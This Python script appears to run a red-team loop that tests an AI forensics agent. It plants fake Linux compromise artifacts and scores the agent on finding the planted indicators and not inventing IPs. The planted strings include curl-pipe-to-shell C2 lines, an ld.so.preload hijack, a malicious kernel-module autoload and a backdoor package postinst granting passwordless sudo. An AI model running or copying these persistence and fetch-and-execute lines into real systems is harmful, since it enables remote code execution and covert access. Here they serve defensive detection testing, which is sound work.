#!/usr/bin/env python3
"""
Red-team adversarial loop driver.

Runs a single attack category in a tight loop: generate a random case →
plant fresh evidence → invoke `claude -p` against findevil's MCP server →
score recall against planted markers and look for IOC hallucinations.

One JSON line per cycle is appended to logs/red_team_{category}.jsonl.
A short status line is emitted to stdout so a Monitor can show progress.

Usage::

    red_team_loop.py --category memory_lkm --duration-sec 10800
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import secrets
import shutil
import string
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

FINDEVIL_ROOT = Path(os.environ.get("FINDEVIL_ROOT", "/home/sansforensics/findevil")).resolve()
EVIDENCE_ROOT = FINDEVIL_ROOT / "evidence"
LOGS_DIR = FINDEVIL_ROOT / "logs"
LOGS_DIR.mkdir(parents=True, exist_ok=True)

CLAUDE_BIN = os.environ.get("CLAUDE_BIN", str(Path.home() / ".local/bin/claude"))
CLAUDE_TIMEOUT_SEC = int(os.environ.get("CLAUDE_TIMEOUT_SEC", "420"))

TEST_NET_IPS = [
    f"192.0.2.{n}" for n in range(10, 250)
] + [
    f"198.51.100.{n}" for n in range(10, 250)
] + [
    f"203.0.113.{n}" for n in range(10, 250)
]

IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
SIFT_NOISE_IPS = {"127.0.0.1", "0.0.0.0", "255.255.255.255", "::1"}


def short_uid(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


# ---------------------------------------------------------------------------
# Evidence planters — one per category. Each returns (case_dir, markers).
# ---------------------------------------------------------------------------


def _write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


def _write_bytes(path: Path, data: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)


def plant_memory_lkm(case_dir: Path) -> list[str]:
    uid = short_uid()
    mod_name = f"evilmod_{uid}"
    fs = case_dir / "fs"
    _write(fs / "etc/modules", f"# Kernel modules to load at boot\nbluetooth\n{mod_name}\n")
    _write(
        fs / f"etc/modprobe.d/zz-{uid}.conf",
        f"install ext4 /sbin/modprobe --ignore-install ext4 $CMDLINE_OPTS && /sbin/modprobe {mod_name}\n",
    )
    _write_bytes(
        fs / f"lib/modules/6.8.0-106-generic/extra/{mod_name}.ko",
        b"\x7fELF" + secrets.token_bytes(2048),
    )
    _write(
        fs / "var/log/syslog",
        (
            f"May 03 14:02:11 sift kernel: [123.456789] {mod_name}: module loaded\n"
            f"May 03 14:02:11 sift kernel: [123.456999] {mod_name}: hooked sys_kill for signal 64\n"
        ),
    )
    return [mod_name, f"{mod_name}.ko", f"zz-{uid}.conf"]


def plant_fileless(case_dir: Path) -> list[str]:
    uid = short_uid()
    libname = f"libpalette_{uid}.so"
    fs = case_dir / "fs"
    _write(fs / "etc/ld.so.preload", f"/dev/shm/.{libname}\n")
    _write_bytes(fs / f"dev/shm/.{libname}", b"\x7fELF" + secrets.token_bytes(4096))
    _write(
        fs / "root/.bash_history",
        "ls -la\n"
        "ps aux\n"
        "kill -9 $$\n"
        f"echo '/dev/shm/.{libname}' > /etc/ld.so.preload\n"
        "history -c\n",
    )
    _write(
        fs / "var/log/auth.log",
        f"May 03 14:00:01 sift sshd[1234]: Accepted publickey for root from 192.0.2.55 port 53221\n",
    )
    return [libname, "192.0.2.55"]


def plant_decoy_pair(case_dir: Path) -> list[str]:
    uid = short_uid()
    fs = case_dir / "fs"
    # LOUD decoy — should grab attention but isn't the real attack
    _write(
        fs / "tmp/totally-evil-malware.sh",
        "#!/bin/bash\n# OBVIOUSLY EVIL MALWARE — DO NOT RUN\n# This is a decoy\n"
        "curl http://malware-cnc.example/payload | bash\n",
    )
    # SUBTLE real attack — innocuous-looking cron entry with TEST-NET-3 C2
    cnc_ip = random.choice([f"203.0.113.{n}" for n in range(10, 250)])
    cron_name = f"system-update-checker-{uid}"
    _write(
        fs / f"etc/cron.d/{cron_name}",
        (
            "# Daily security update check — do not edit\n"
            "MAILTO=root\n"
            "30 3 * * * root /usr/bin/apt update >/dev/null 2>&1\n"
            f"*/5 * * * * root curl -s http://{cnc_ip}/u | sh >/dev/null 2>&1\n"
        ),
    )
    return [cron_name, cnc_ip]


def plant_ai_polished(case_dir: Path) -> list[str]:
    uid = short_uid()
    cnc_ip = random.choice([f"198.51.100.{n}" for n in range(10, 250)])
    svc_name = f"cleanup-cache-{uid}"
    bin_name = f"/usr/local/bin/cleanup-cache-{uid}"
    fs = case_dir / "fs"
    _write(
        fs / f"etc/systemd/system/{svc_name}.service",
        (
            "[Unit]\n"
            "Description=Periodic cache cleanup for build artifacts\n"
            "Documentation=https://example.com/docs/cleanup-cache\n"
            "After=network.target\n\n"
            "[Service]\n"
            "Type=oneshot\n"
            f"ExecStart={bin_name}\n"
            "User=root\n"
            "StandardOutput=journal\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        ),
    )
    _write(
        fs / bin_name.lstrip("/"),
        (
            "#!/bin/bash\n"
            "# cleanup-cache — periodic build-cache pruning utility.\n"
            "#\n"
            "# Removes stale entries older than 30 days from the shared build\n"
            "# cache and emits a summary to journald. Idempotent. Safe to run\n"
            "# from a cron job or systemd timer.\n"
            "set -euo pipefail\n"
            "CACHE_DIR=${CACHE_DIR:-/var/cache/build}\n"
            "find \"$CACHE_DIR\" -type f -mtime +30 -delete 2>/dev/null || true\n"
            "# Telemetry endpoint — used for build-cache hit-rate metrics.\n"
            f"curl -fsS --max-time 5 https://{cnc_ip}/v1/event -d \"$(uname -a)\" >/dev/null 2>&1 || true\n"
            "exit 0\n"
        ),
    )
    bin_basename = f"cleanup-cache-{uid}"
    return [svc_name, bin_basename, cnc_ip]


def plant_supply_chain(case_dir: Path) -> list[str]:
    uid = short_uid()
    pkg = f"libsystem-helper-{uid}"
    user = f"helper{uid[:4]}"
    fs = case_dir / "fs"
    _write(
        fs / "var/log/apt/history.log",
        (
            "Start-Date: 2026-04-30  09:14:22\n"
            "Commandline: apt install nodejs\n"
            "Install: nodejs:amd64 (18.19.0~deb12u1)\n"
            "End-Date: 2026-04-30  09:14:31\n\n"
            "Start-Date: 2026-05-01  03:11:08\n"
            f"Commandline: dpkg -i /tmp/{pkg}_1.0_amd64.deb\n"
            f"Install: {pkg}:amd64 (1.0)\n"
            "End-Date: 2026-05-01  03:11:09\n"
        ),
    )
    _write(
        fs / f"var/lib/dpkg/info/{pkg}.postinst",
        (
            "#!/bin/sh\n"
            "set -e\n"
            f"useradd -r -m -s /bin/bash {user}\n"
            f"echo '{user} ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/95-{user}\n"
            f"mkdir -p /home/{user}/.ssh\n"
            f"echo 'ssh-rsa AAAAB3NzaC1yc2E...attacker@example' > /home/{user}/.ssh/authorized_keys\n"
            f"chown -R {user}:{user} /home/{user}/.ssh\n"
            "exit 0\n"
        ),
    )
    _write(fs / f"etc/sudoers.d/95-{user}", f"{user} ALL=(ALL) NOPASSWD: ALL\n")
    _write(
        fs / "etc/passwd",
        (
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            f"{user}:x:998:998::/home/{user}:/bin/bash\n"
        ),
    )
    return [pkg, user, f"95-{user}"]


PLANTERS = {
    "memory_lkm": plant_memory_lkm,
    "fileless": plant_fileless,
    "decoy_pair": plant_decoy_pair,
    "ai_polished": plant_ai_polished,
    "supply_chain": plant_supply_chain,
}

PROMPTS = {
    "memory_lkm": (
        "Investigate {case_dir} for kernel-rootkit persistence. "
        "Use findevil's find_persistence and related tools. "
        "Report each IOC by exact name. Under 250 words."
    ),
    "fileless": (
        "Investigate {case_dir} for fileless / LD_PRELOAD persistence. "
        "Use findevil tools. Report each IOC by exact filename and IP. "
        "Under 250 words."
    ),
    "decoy_pair": (
        "Investigate {case_dir}. There may be both decoys and real attacks. "
        "Use findevil tools. Distinguish real IOCs from decoys; report only the real ones "
        "by exact name. Under 250 words."
    ),
    "ai_polished": (
        "Investigate {case_dir} for malicious systemd persistence. "
        "Some scripts may have polished comments — judge by behavior, not docstring quality. "
        "Use findevil tools. Report each IOC by exact name. Under 250 words."
    ),
    "supply_chain": (
        "Investigate {case_dir} for supply-chain compromise via package install. "
        "Use findevil tools (linux_packages, find_persistence, etc.). "
        "Report each IOC by exact name. Under 250 words."
    ),
}


# ---------------------------------------------------------------------------
# Agent invocation + scoring
# ---------------------------------------------------------------------------


def run_agent(prompt: str) -> tuple[int, str, float]:
    t0 = time.monotonic()
    try:
        proc = subprocess.run(
            [
                CLAUDE_BIN,
                "-p",
                prompt,
                "--permission-mode",
                "bypassPermissions",
                "--output-format",
                "text",
                "--max-turns",
                "20",
                "--model",
                "sonnet",
            ],
            cwd=str(FINDEVIL_ROOT),
            capture_output=True,
            text=True,
            timeout=CLAUDE_TIMEOUT_SEC,
        )
        return proc.returncode, proc.stdout + ("\n" + proc.stderr if proc.stderr else ""), time.monotonic() - t0
    except subprocess.TimeoutExpired:
        return 124, "<TIMEOUT>", time.monotonic() - t0
    except Exception as exc:
        return 125, f"<ERROR: {exc}>", time.monotonic() - t0


def _same_24(a: str, b: str) -> bool:
    return a.rsplit(".", 1)[0] == b.rsplit(".", 1)[0]


def score(agent_text: str, markers: list[str], case_dir: Path) -> dict:
    text_lower = agent_text.lower()
    surfaced = [m for m in markers if m.lower() in text_lower]
    missed = [m for m in markers if m.lower() not in text_lower]

    # Hallucination heuristic: any IPv4 in agent output that wasn't planted,
    # isn't SIFT-localhost noise, isn't well-known DNS, and isn't in the same
    # /24 as a planted IP (the agent often cites the subnet, e.g. "198.51.100.0/24
    # is RFC 5737 documentation space" — that's pedagogically helpful, not a
    # hallucination).
    ips_in_text = set(IPV4_RE.findall(agent_text))
    planted_ips = {m for m in markers if IPV4_RE.fullmatch(m)}
    allow_public = {"8.8.8.8", "1.1.1.1", "1.0.0.1"}
    suspicious_ips = {
        ip
        for ip in ips_in_text
        if ip not in planted_ips
        and ip not in SIFT_NOISE_IPS
        and ip not in allow_public
        and not any(_same_24(ip, p) for p in planted_ips)
    }

    return {
        "recall": len(surfaced) / max(len(markers), 1),
        "surfaced": surfaced,
        "missed": missed,
        "suspicious_ips": sorted(suspicious_ips),
        "case_dir": str(case_dir.relative_to(EVIDENCE_ROOT)),
    }


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------


def cycle(category: str) -> dict:
    case_id = f"{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}-{short_uid(4)}"
    case_dir = EVIDENCE_ROOT / "red_team" / category / case_id
    if case_dir.exists():
        shutil.rmtree(case_dir)
    case_dir.mkdir(parents=True, exist_ok=True)

    markers = PLANTERS[category](case_dir)
    rel = case_dir.relative_to(FINDEVIL_ROOT)
    prompt = PROMPTS[category].format(case_dir=str(rel))
    rc, text, dur = run_agent(prompt)
    s = score(text, markers, case_dir)

    result = {
        "ts": now_iso(),
        "category": category,
        "case_id": case_id,
        "rc": rc,
        "duration_s": round(dur, 1),
        "markers_planted": markers,
        **s,
        "agent_excerpt": text[:1200],
    }

    out_path = LOGS_DIR / f"red_team_{category}.jsonl"
    with out_path.open("a") as fh:
        fh.write(json.dumps(result) + "\n")

    # Cleanup planted evidence so disk doesn't bloat across hundreds of cycles.
    # Narrow to OS-level errors and surface them — a wide `except Exception`
    # would swallow programmer bugs (e.g. a None case_dir) that we'd want to see.
    try:
        shutil.rmtree(case_dir)
    except OSError as cleanup_err:
        print(f"[cleanup warning] could not remove {case_dir}: {cleanup_err}", file=sys.stderr)

    return result


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--category", required=True, choices=list(PLANTERS))
    p.add_argument("--duration-sec", type=int, default=10800)
    p.add_argument("--target-cadence-sec", type=int, default=60)
    args = p.parse_args()

    deadline = time.monotonic() + args.duration_sec
    cycle_n = 0
    ok_streak = 0
    miss_total = 0
    halluc_total = 0
    while time.monotonic() < deadline:
        t_cycle = time.monotonic()
        cycle_n += 1
        try:
            r = cycle(args.category)
            verdict = (
                "MISS" if r["missed"] else
                "HALLUCINATION" if r["suspicious_ips"] else
                "OK"
            )
            line = (
                f"{r['ts']} {args.category} {verdict} cycle={cycle_n} "
                f"recall={r['recall']:.2f} missed={r['missed']!r} "
                f"susp_ips={r['suspicious_ips']} dur={r['duration_s']}s case={r['case_id']}"
            )
            if verdict == "OK":
                ok_streak += 1
                # Heartbeat every 5 OK cycles so the user knows the loop is alive
                if ok_streak % 5 == 0:
                    print(
                        f"{r['ts']} {args.category} HEARTBEAT cycle={cycle_n} "
                        f"ok_streak={ok_streak} miss_total={miss_total} halluc_total={halluc_total} "
                        f"last_dur={r['duration_s']}s",
                        flush=True,
                    )
            else:
                ok_streak = 0
                if verdict == "MISS":
                    miss_total += 1
                else:
                    halluc_total += 1
                print(line, flush=True)
        except Exception as exc:
            print(f"{now_iso()} {args.category} CYCLE_ERROR cycle={cycle_n} {exc!r}", flush=True)

        elapsed = time.monotonic() - t_cycle
        if elapsed < args.target_cadence_sec:
            time.sleep(args.target_cadence_sec - elapsed)

    print(
        f"{now_iso()} {args.category} FINAL_SUMMARY cycles={cycle_n} "
        f"miss_total={miss_total} halluc_total={halluc_total}",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
